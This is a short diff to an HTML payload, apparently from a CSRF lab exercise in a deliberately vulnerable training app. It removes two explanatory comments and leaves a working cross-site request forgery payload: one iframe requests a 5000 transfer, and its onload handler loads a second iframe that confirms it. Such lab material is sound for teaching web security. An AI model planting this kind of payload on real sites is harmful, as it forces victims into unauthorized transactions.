@@ -1,6 +1,3 @@
-<!-- Exploitable field: Message -->
-<!-- Payload: first img sets src of second img, which confirms the transfer -->
-
 <iframe src="attack?Screen=1471017872&menu=900&transfer=5000"
 onload="document.getElementById('if1').src='attack?Screen=1471017872&menu=900&transfer=CONFIRMED';"></iframe>
 <iframe id="if1"></iframe>
